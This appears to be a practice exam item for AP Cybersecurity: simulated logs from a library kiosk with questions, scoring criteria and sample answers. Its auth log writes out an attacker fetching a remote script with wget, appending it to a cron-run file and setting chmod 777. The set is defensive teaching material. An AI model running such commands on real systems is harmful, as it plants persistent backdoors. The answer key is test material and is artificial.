@@ -1,0 +1,331 @@
+{
+  "_comment": [
+    "DEVICE SECURITY ANALYSIS practice set 1.",
+    "",
+    "Shape taken from the CED sample (page 159-166), recorded in",
+    "docs/cyber-exam-format.md. Six sources from ONE device, parts A to E.",
+    "",
+    "WHAT IS PLANTED, so a future author does not break it by tidying:",
+    "  - Part B's password attack: rows 3-12 of the auth log, an FTP user",
+    "    enumeration from 198.51.100.77. Ten failures, ten different usernames,",
+    "    one per second. That pattern IS the answer to B(i).",
+    "  - Part D's blocked connection: auth log row 19 shows an RDP attempt from",
+    "    203.0.113.9 that never completes, because firewall rule 8 denies 3389.",
+    "  - Part E's second attack: rows 21-27, a successful SSH login as",
+    "    'kiosk' from 198.51.100.77 followed immediately by wget of a remote",
+    "    script and a cron edit. Persistence after credential compromise, and it",
+    "    is deliberately the SAME source IP as part B so a student who reads",
+    "    carefully sees the escalation rather than two unrelated events.",
+    "  - Part C's file: notes_backup.sh is 0777 (-rwxrwxrwx), world-writable, and",
+    "    it is the file cron runs. That is the link between C and E.",
+    "",
+    "The device is a public library catalogue kiosk, chosen because a student",
+    "can reason about who physically touches it without knowing any product."
+  ],
+
+  "course": "ap-cybersecurity",
+  "set_id": "dsa-library-kiosk",
+  "title": "Device Security Analysis: the library catalogue kiosk",
+  "device": "Public catalogue kiosk, Greenfield Community Library",
+  "est_minutes": 50,
+  "page_handle": "ap-cybersecurity-frq-library-kiosk",
+  "page_title": "AP Cybersecurity FRQ Practice: Device Security Analysis | Library Kiosk",
+  "seo_description": "A full Device Security Analysis practice question in the real exam format: six sources from one device, parts A to E, with sample responses and scoring notes.",
+
+  "intro": [
+    "The following sources all come from the same device and were captured during a risk assessment.",
+    "The device is the public catalogue kiosk in the lobby of Greenfield Community Library. Its IP address is 192.168.4.20. Library members use it without signing in. Staff use the same machine to check items back in.",
+    "Use the sources to respond to parts A, B, C, D, and E. Label any subparts. Cite specific evidence from the sources in your responses."
+  ],
+
+  "sources": [
+    {
+      "kind": "firewall-rules",
+      "label": "Source 1: Device firewall settings",
+      "note": "The device's IP address is 192.168.4.20.",
+      "columns": ["Rule", "Action", "Source", "Destination", "Direction", "Port", "Protocol"],
+      "rules": [
+        ["1", "Allow", "ALL", "192.168.4.20", "Inbound", "22", "SSH"],
+        ["2", "Allow", "ALL", "192.168.4.20", "Inbound", "21", "FTP"],
+        ["3", "Allow", "ALL", "192.168.4.20", "Inbound", "80", "HTTP"],
+        ["4", "Allow", "ALL", "192.168.4.20", "Inbound", "443", "HTTPS"],
+        ["5", "Allow", "192.168.4.0/24", "192.168.4.20", "Inbound", "445", "SMB"],
+        ["6", "Allow", "192.168.4.11", "192.168.4.20", "Inbound", "5900", "VNC"],
+        ["7", "Deny", "198.51.100.77", "192.168.4.20", "Inbound", "80", "HTTP"],
+        ["8", "Deny", "ALL", "192.168.4.20", "Inbound", "3389", "RDP"],
+        ["9", "Allow", "192.168.4.20", "ALL", "Outbound", "ALL", "ALL"],
+        ["10", "Deny", "ALL", "ALL", "Inbound", "ALL", "ALL"]
+      ]
+    },
+    {
+      "kind": "auth-log",
+      "label": "Source 2: Authorization log",
+      "command": "sudo tail -n 30 /var/log/auth.log",
+      "lines": [
+        "1 - Mar 03 08:02:11 kiosk sshd[901]: Server listening on 0.0.0.0 port 22.",
+        "2 - Mar 03 08:14:52 kiosk systemd-logind[712]: New session 4 of user kiosk.",
+        "3 - Mar 03 11:20:01 kiosk vsftpd[2210]: Failed login for invalid user admin from 198.51.100.77 port 21 ftp",
+        "4 - Mar 03 11:20:02 kiosk vsftpd[2212]: Failed login for invalid user root from 198.51.100.77 port 21 ftp",
+        "5 - Mar 03 11:20:03 kiosk vsftpd[2214]: Failed login for invalid user test from 198.51.100.77 port 21 ftp",
+        "6 - Mar 03 11:20:04 kiosk vsftpd[2216]: Failed login for invalid user guest from 198.51.100.77 port 21 ftp",
+        "7 - Mar 03 11:20:05 kiosk vsftpd[2218]: Failed login for invalid user library from 198.51.100.77 port 21 ftp",
+        "8 - Mar 03 11:20:06 kiosk vsftpd[2220]: Failed login for invalid user catalog from 198.51.100.77 port 21 ftp",
+        "9 - Mar 03 11:20:07 kiosk vsftpd[2222]: Failed login for invalid user staff from 198.51.100.77 port 21 ftp",
+        "10 - Mar 03 11:20:08 kiosk vsftpd[2224]: Failed login for invalid user backup from 198.51.100.77 port 21 ftp",
+        "11 - Mar 03 11:20:09 kiosk vsftpd[2226]: Failed login for invalid user oracle from 198.51.100.77 port 21 ftp",
+        "12 - Mar 03 11:20:10 kiosk vsftpd[2228]: Failed login for invalid user kiosk from 198.51.100.77 port 21 ftp",
+        "13 - Mar 03 11:31:44 kiosk CRON[2301]: pam_unix(cron:session): session opened for user root by (uid=0)",
+        "14 - Mar 03 11:31:44 kiosk CRON[2301]: pam_unix(cron:session): session closed for user root",
+        "15 - Mar 03 12:05:19 kiosk sudo: staff : TTY=pts/1 ; PWD=/home/staff ; USER=root ; COMMAND=/usr/bin/apt-get update",
+        "16 - Mar 03 12:05:20 kiosk sudo: pam_unix(sudo:session): session opened for user root by staff(uid=1001)",
+        "17 - Mar 03 12:06:02 kiosk sudo: pam_unix(sudo:session): session closed for user root",
+        "18 - Mar 03 13:47:03 kiosk systemd-logind[712]: New session 9 of user kiosk.",
+        "19 - Mar 03 14:02:55 kiosk kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.9 DST=192.168.4.20 PROTO=TCP SPT=51844 DPT=3389",
+        "20 - Mar 03 14:03:01 kiosk kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.9 DST=192.168.4.20 PROTO=TCP SPT=51845 DPT=3389",
+        "21 - Mar 03 15:12:38 kiosk sshd[3390]: Accepted password for kiosk from 198.51.100.77 port 44120 ssh2",
+        "22 - Mar 03 15:12:38 kiosk sshd[3390]: pam_unix(sshd:session): session opened for user kiosk by (uid=0)",
+        "23 - Mar 03 15:13:04 kiosk kiosk: executed command: 'whoami'",
+        "24 - Mar 03 15:13:22 kiosk kiosk: executed command: 'wget http://198.51.100.77/upd.sh -O /tmp/upd.sh'",
+        "25 - Mar 03 15:13:40 kiosk kiosk: executed command: 'cat /tmp/upd.sh >> /home/kiosk/scripts/notes_backup.sh'",
+        "26 - Mar 03 15:14:02 kiosk kiosk: executed command: 'crontab -l'",
+        "27 - Mar 03 15:14:31 kiosk kiosk: executed command: 'chmod 777 /home/kiosk/scripts/notes_backup.sh'",
+        "28 - Mar 03 15:15:10 kiosk sshd[3390]: pam_unix(sshd:session): session closed for user kiosk",
+        "29 - Mar 03 16:00:01 kiosk CRON[3502]: (kiosk) CMD (/home/kiosk/scripts/notes_backup.sh)",
+        "30 - Mar 03 16:00:02 kiosk CRON[3502]: pam_unix(cron:session): session closed for user kiosk"
+      ]
+    },
+    {
+      "kind": "app-log",
+      "label": "Source 3: Catalogue application log",
+      "command": "sudo tail -n 12 /var/log/app/catalog.log",
+      "lines": [
+        "1 - Mar 03 08:15:00 kiosk catalog[820]: service started, listening on 127.0.0.1:8080",
+        "2 - Mar 03 09:41:12 kiosk catalog[820]: search query served in 34ms",
+        "3 - Mar 03 11:19:58 kiosk catalog[820]: health check ok",
+        "4 - Mar 03 11:20:11 kiosk catalog[820]: health check ok",
+        "5 - Mar 03 13:02:44 kiosk catalog[820]: search query served in 41ms",
+        "6 - Mar 03 15:13:25 kiosk catalog[820]: outbound request to 198.51.100.77:80 completed",
+        "7 - Mar 03 15:16:00 kiosk catalog[820]: health check ok",
+        "8 - Mar 03 16:00:03 kiosk catalog[820]: outbound request to 198.51.100.77:80 completed",
+        "9 - Mar 03 16:30:01 kiosk catalog[820]: health check ok",
+        "10 - Mar 03 17:00:04 kiosk catalog[820]: outbound request to 198.51.100.77:80 completed",
+        "11 - Mar 03 17:30:00 kiosk catalog[820]: health check ok",
+        "12 - Mar 03 18:00:03 kiosk catalog[820]: outbound request to 198.51.100.77:80 completed"
+      ]
+    },
+    {
+      "kind": "file-listing",
+      "label": "Source 4: File permissions in /home/kiosk/scripts",
+      "command": "ls -l /home/kiosk/scripts",
+      "columns": ["Permissions", "Links", "Owner", "Group", "Size", "Modified", "Name"],
+      "entries": [
+        ["-rwxrwxrwx", "1", "kiosk", "kiosk", "1840", "Mar 03 15:14", "notes_backup.sh"],
+        ["-rwxr-x---", "1", "root", "staff", "2204", "Feb 11 09:20", "checkin_sync.sh"],
+        ["-rw-r--r--", "1", "root", "root", "512", "Jan 08 14:02", "kiosk.conf"],
+        ["-rw-rw-rw-", "1", "kiosk", "kiosk", "9931", "Mar 03 12:44", "patron_holds.csv"],
+        ["-rw-------", "1", "root", "root", "1024", "Jan 08 14:02", "db_credentials.ini"]
+      ]
+    },
+    {
+      "kind": "process-list",
+      "label": "Source 5: Listening services",
+      "command": "ss -tuln",
+      "lines": [
+        "Netid  State   Local Address:Port    Peer Address:Port",
+        "tcp    LISTEN  0.0.0.0:22           0.0.0.0:*",
+        "tcp    LISTEN  0.0.0.0:21           0.0.0.0:*",
+        "tcp    LISTEN  0.0.0.0:80           0.0.0.0:*",
+        "tcp    LISTEN  127.0.0.1:8080       0.0.0.0:*",
+        "tcp    LISTEN  0.0.0.0:445          0.0.0.0:*"
+      ]
+    },
+    {
+      "kind": "policy",
+      "label": "Source 6: Library device acceptable use policy",
+      "sections": {
+        "Required": [
+          "The kiosk operating system and catalogue application must receive security updates within 7 days of release.",
+          "Staff must use their own named account when performing maintenance on the kiosk.",
+          "Files containing patron information must be readable only by the account that owns them."
+        ],
+        "Permitted": [
+          "Members may search the catalogue and print call slips without signing in.",
+          "Staff may connect to the kiosk from the staff workstation at 192.168.4.11 for remote support."
+        ],
+        "Prohibited": [
+          "Downloading or running software from outside the library's approved repository.",
+          "Sharing the kiosk account password with anyone, including other staff.",
+          "Storing patron information anywhere other than the library management system."
+        ]
+      }
+    }
+  ],
+
+  "parts": {
+    "A": {
+      "subject": "policy",
+      "stem": "Consider the acceptable use policy in Source 6.",
+      "subparts": [
+        {
+          "verb": "Explain",
+          "prompt": "Explain how one part of the policy helps protect the device.",
+          "credit": [
+            "Names one specific policy item",
+            "Explains the protection in terms of a threat it reduces, not just restating the rule"
+          ],
+          "sample": "The Required section says the operating system and catalogue application must receive security updates within 7 days of release. This protects the device because a known vulnerability becomes public knowledge when the patch does. An adversary scanning for unpatched services, like the FTP and SSH services listening on all interfaces in Source 5, would otherwise have an indefinite window in which a published exploit still works. A 7 day ceiling limits that window."
+        },
+        {
+          "verb": "Explain",
+          "prompt": "Explain how one rule in the current policy could be modified to make the device more secure. Include a specific example in your response.",
+          "credit": [
+            "Identifies a specific rule that is currently too weak",
+            "States a concrete modification, not a general aspiration",
+            "Connects the modification to evidence from the sources"
+          ],
+          "sample": "The Permitted section allows members to use the kiosk without signing in, which the library needs, but it says nothing about what the shared kiosk account may do. Source 2 shows an adversary logging in over SSH as the kiosk account at 15:12:38 and immediately downloading and running a script. The rule could be modified to say that the kiosk account may run only the catalogue application and may not open a remote session or execute downloaded files. Concretely, the kiosk account's shell could be set to /usr/sbin/nologin so an accepted SSH password produces no usable session at all."
+        }
+      ]
+    },
+
+    "B": {
+      "subject": "password-attack",
+      "stem": "In the authorization log, there is evidence of a password attack in rows 3 to 12.",
+      "subparts": [
+        {
+          "verb": "Describe",
+          "prompt": "Describe the evidence in the log file that indicates a password attack. Include specific entries from the log file in your response.",
+          "credit": [
+            "Cites at least two specific rows",
+            "Names the pattern: many failures, different usernames, one source, rapid succession",
+            "Identifies it as username enumeration or a brute force attempt against FTP"
+          ],
+          "sample": "Rows 3 to 12 are ten consecutive failed FTP logins from the same address, 198.51.100.77, at one second intervals from 11:20:01 to 11:20:10. Each attempt uses a different username: admin, root, test, guest, library, catalog, staff, backup, oracle, kiosk. A person mistyping a password fails on the same username repeatedly; failing once each on ten different usernames, at machine speed, is an automated attempt to discover which accounts exist. The usernames themselves are a mix of common defaults and guesses specific to this site, which is what a username enumeration attack looks like."
+        },
+        {
+          "verb": "Identify",
+          "prompt": "Identify the IP address of the adversary.",
+          "credit": ["States 198.51.100.77"],
+          "sample": "198.51.100.77"
+        }
+      ]
+    },
+
+    "C": {
+      "subject": "permissions",
+      "stem": "Consider all the sources from the device.",
+      "subparts": [
+        {
+          "verb": "Explain",
+          "prompt": "Explain how the permission settings for one file in the /home/kiosk/scripts directory determine the level of access for that file for the owner, group, and all other users on the system. Include the name of the file in your response.",
+          "credit": [
+            "Names a specific file from Source 4",
+            "Reads all three permission triads correctly",
+            "States what each class of user can actually do"
+          ],
+          "sample": "notes_backup.sh has permissions -rwxrwxrwx. The first triad, rwx, gives the owner kiosk read, write and execute. The second triad, rwx, gives the group kiosk the same three. The third triad, rwx, gives every other user on the system read, write and execute as well. In practice that means any account on the kiosk, including the unauthenticated session a library member uses, can not only run this script but rewrite its contents. Source 2 row 29 shows cron running this exact file, so whatever any user writes into it will be executed on the next scheduled run."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Other than removing all permissions from all users, describe one way the permission settings for one file on the system could be configured to restrict access for some users on the device. Include the name of the file in your response.",
+          "credit": [
+            "Names a specific file",
+            "Describes a restriction that still leaves the file usable for its purpose",
+            "Identifies which class of user loses which access"
+          ],
+          "sample": "patron_holds.csv currently has -rw-rw-rw-, so every user on the device can read and modify patron hold records. It could be configured so the owner kiosk keeps read and write, the group keeps read only, and all other users have no access at all. The catalogue application, which runs as kiosk, would still be able to update holds, staff in the group could still read the file for reference, and a member using the public session would be unable to open it. That also brings the file into line with the policy in Source 6, which requires files containing patron information to be readable only by the account that owns them."
+        },
+        {
+          "verb": "Write",
+          "prompt": "Using the explanation from part C (ii), write one or more chmod commands that set the permissions described.",
+          "credit": [
+            "Command names the correct file",
+            "Mode produces exactly the described access",
+            "Syntax is a valid chmod invocation"
+          ],
+          "sample": "chmod 640 /home/kiosk/scripts/patron_holds.csv\n\nThe 6 gives the owner read and write, the 4 gives the group read only, and the 0 gives all other users nothing. The symbolic form chmod u=rw,g=r,o= /home/kiosk/scripts/patron_holds.csv sets the same permissions. Note that a stricter reading of the policy, readable only by the owner, would be chmod 600 instead."
+        }
+      ]
+    },
+
+    "D": {
+      "subject": "firewall",
+      "stem": "Consider all the sources from the device.",
+      "subparts": [
+        {
+          "verb": "Explain",
+          "prompt": "Explain how one connection attempt on the device was blocked by the device's firewall. Include evidence from a log file in your response.",
+          "credit": [
+            "Cites a specific log row showing the block",
+            "Names the rule number that caused it",
+            "Matches the port and protocol in the log to the rule"
+          ],
+          "sample": "Rows 19 and 20 of the authorization log show UFW BLOCK entries at 14:02:55 and 14:03:01 for traffic from 203.0.113.9 to 192.168.4.20 on destination port 3389. Rule 8 in Source 1 denies all inbound traffic to this device on port 3389, RDP. The connection attempt matched that rule before it could reach any service, which is why the log records a block rather than a failed or accepted login."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Other than allowing all traffic for all services, describe a modification to one firewall rule that would allow the connection attempt identified in part D (i).",
+          "credit": [
+            "Names the rule being changed",
+            "The modification is scoped, not a blanket allow",
+            "Would actually permit the specific attempt described"
+          ],
+          "sample": "Rule 8 currently denies inbound RDP from all sources. It could be modified to deny inbound port 3389 from all sources except a named administrative host, or replaced by a pair of rules: an allow for source 203.0.113.9 to destination 192.168.4.20 inbound on port 3389, placed above the existing deny, with the deny left in place for everything else. Because rule 10 denies everything not already matched, the allow has to sit above both rule 8 and rule 10 to take effect."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Other than allowing the connection attempt identified in part D (i), describe one impact of your modification from part D (ii) on incoming or outgoing network traffic on the device.",
+          "credit": [
+            "Describes a consequence beyond the intended one",
+            "The consequence follows from the specific modification made"
+          ],
+          "sample": "Opening 3389 to a single external address means the device now answers RDP to anything that can present that source address. An adversary who can spoof the source address, or who compromises the host at 203.0.113.9, reaches a remote desktop service that was previously unreachable from outside. It also means RDP traffic now traverses the library network to the kiosk, so any monitoring on the segment sees a new protocol in normal use and an alert on port 3389 stops being a reliable signal that something is wrong."
+        }
+      ]
+    },
+
+    "E": {
+      "subject": "second-attack",
+      "stem": "Apart from the password attack identified in part B, there is evidence of another attack on the device. Consider all the sources from the device.",
+      "subparts": [
+        {
+          "verb": "Determine",
+          "prompt": "Determine the type of attack evidenced in a log file.",
+          "credit": [
+            "Names a specific attack type",
+            "The type matches the evidence, for example persistence, malware installation, or a backdoor established after credential compromise"
+          ],
+          "sample": "After a successful credential compromise, the adversary installed a persistent backdoor. The SSH login at row 21 succeeds using the kiosk account password, and the commands that follow download remote code and attach it to a script that a scheduled job already runs."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Describe specific information in the log file that indicates the attack named in part E (i).",
+          "credit": [
+            "Cites the successful login row and its source address",
+            "Cites the download and the append to a script",
+            "Connects it to the scheduled execution, showing why it persists"
+          ],
+          "sample": "Row 21 shows Accepted password for kiosk from 198.51.100.77, the same address that ran the FTP username enumeration in part B, so the earlier reconnaissance and this login are the same actor. Rows 24 and 25 show wget fetching upd.sh from that address and appending it to /home/kiosk/scripts/notes_backup.sh. Row 27 shows chmod 777 applied to that script, and row 29 shows cron executing the same file at 16:00. The catalogue application log then records outbound requests to 198.51.100.77 at 16:00, 17:00 and 18:00, an hourly beacon that continues after the session in row 28 has closed. The attacker no longer needs to log in, which is what makes this persistence rather than a one time intrusion."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Describe one way an automated system could halt this type of attack in real time.",
+          "credit": [
+            "Names a specific automated control",
+            "Explains the mechanism by which it stops this attack, not security in general"
+          ],
+          "sample": "An intrusion prevention system inspecting outbound traffic could halt it. The hourly connections to 198.51.100.77 recorded in the catalogue log are a regular beacon to a single external address that the device has no business contacting. An IPS with a rule for repeated fixed interval outbound connections to a non approved destination can drop the traffic and terminate the session as it happens, which stops the backdoor receiving instructions even though the modified script is still on disk. File integrity monitoring on /home/kiosk/scripts would also fire the moment notes_backup.sh changed at 15:13."
+        },
+        {
+          "verb": "Identify",
+          "prompt": "This attack could be mitigated by an automated system, such as a firewall, IDS, IPS, or AI. Identify a different countermeasure that could mitigate, prevent, or deter the attack.",
+          "credit": [
+            "Names a countermeasure that is not an automated detection system",
+            "Plausibly prevents, mitigates or deters this specific attack"
+          ],
+          "sample": "Removing the shared kiosk account password and requiring named staff accounts with multi factor authentication would prevent it. The attack begins at row 21 with a correct password for a shared account that Source 6 already prohibits sharing. If SSH accepted no password for the kiosk account, the enumeration in part B would find a name but no way in, and every step that followed becomes impossible. This is an administrative control rather than an automated one, which is why it holds even when the monitoring is switched off."
+        }
+      ]
+    }
+  }
+}
